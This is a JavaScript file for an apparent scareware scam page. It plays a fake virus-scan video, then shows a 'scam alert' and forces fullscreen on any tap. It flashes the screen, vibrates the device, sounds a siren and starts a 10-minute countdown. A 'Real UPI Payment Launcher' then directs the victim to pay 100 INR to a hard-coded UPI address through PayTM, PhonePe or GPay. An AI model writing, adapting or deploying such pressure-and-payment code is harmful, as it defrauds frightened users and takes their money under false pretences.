document.addEventListener('DOMContentLoaded', function() {
    const video = document.getElementById('Video');
    const siren = document.getElementById('siren');
    
    // Set video end handler
    video.addEventListener('ended', showScamAlert);
    
    // Enter fullscreen on interaction
    document.addEventListener('click', enterFullscreen);
    document.addEventListener('touchstart', enterFullscreen);
});

function enterFullscreen() {
    if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen().catch(console.log);
    }
}

function showScamAlert() {
    document.getElementById('virusScan').classList.add('hidden');
    document.getElementById('scamAlert').classList.remove('hidden');
    
    // Start effects
    document.body.classList.add('flashing');
    if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);
    document.getElementById('siren').play().catch(console.log);
    
    // Start countdown
    startCountdown();
}

function startCountdown() {
    let time = 600; // 10 minutes
    const element = document.getElementById('countdown');
    
    const timer = setInterval(() => {
        const minutes = Math.floor(time / 60);
        const seconds = time % 60;
        
        element.textContent = 
            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (--time < 0) {
            clearInterval(timer);
            element.textContent = '00:00';
            element.style.color = 'red';
        }
    }, 1000);
}


// Vibrate + flash screen
function triggerAlert() {
    document.body.classList.add("flashing");
    if ("vibrate" in navigator) navigator.vibrate([500, 200, 500]);
    siren.play().catch(e => console.log("Audio blocked. Tap screen first:", e));
}



 // Real UPI Payment Launcher
function Payment(app) {
  if ("vibrate" in navigator) navigator.vibrate(200);

  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=100&cu=INR";
  let upiURL = baseUPI;

  if (app === "PayTM") {
    upiURL += "&mc=0000&mode=02&orgid=159761";
  } else if (app === "PhonePe") {
    upiURL += "&mc=0000&mode=04&orgid=189999";
  } else if (app === "GPay") {
    upiURL += "&mc=0000&mode=05&orgid=000000";
  }

  window.location.href = upiURL;
}

// Allow exiting fullscreen
document.addEventListener('keydown', (e) => {
  if (e.key === 'F11' || e.key === 'Escape') {
    document.exitFullscreen();
  }
})
 